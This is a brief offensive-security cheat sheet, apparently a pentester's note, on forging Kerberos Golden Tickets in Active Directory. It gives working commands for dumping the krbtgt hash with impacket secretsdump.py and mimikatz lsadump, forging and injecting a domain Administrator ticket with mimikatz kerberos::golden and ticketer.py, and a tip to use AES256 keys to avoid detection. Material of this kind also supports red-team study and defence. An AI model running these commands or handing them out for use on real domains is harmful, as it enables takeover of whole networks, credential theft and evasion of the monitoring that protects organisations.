- TGTs are encrypted with the `krbtgt`'s key derived from it's password.
- If we get hold of this key, we can forge TGTs for any user subsequently getting access to any service as any user. These tickets are called Golden Tickets.
- This can be done using dumping credential of the domain controller or via [[DCSync]] attack.
- This can also be done by dumping the NTDS.dit file locally.
- Using impacket's secretsdump.py:
```bash
secretsdump.py 'mydomain.local/drdragon@192.168.2.2' -just-dc-user krbtgt
```
- Using mimikatz to get the krbtgt hash and the create TGT
```powershell
lsadump::lsa /patch

kerberos::golden /User:Administrator /domain:<domain-FQDN> /sid:<domain-sid> /krbtgt:<kerberos-key> /id:<id> /groups:<group> /startoffset:0 /endin:600 /renewmax:10080 [/ptt(injects TGT in memory)|/ticket(saves ticket to file)]
```
- To issue TGTs from the keys, impacket's ticketer.py can be used:
```bash
ticketer.py -domain-sid <domainSID> -domain mydomain.local -aes <aesKey> Administrator
# This will create the TGT for the Administrator user and save it in Administrator.ccache
```
- AES256 keys should be used to avoid any alerts or detection.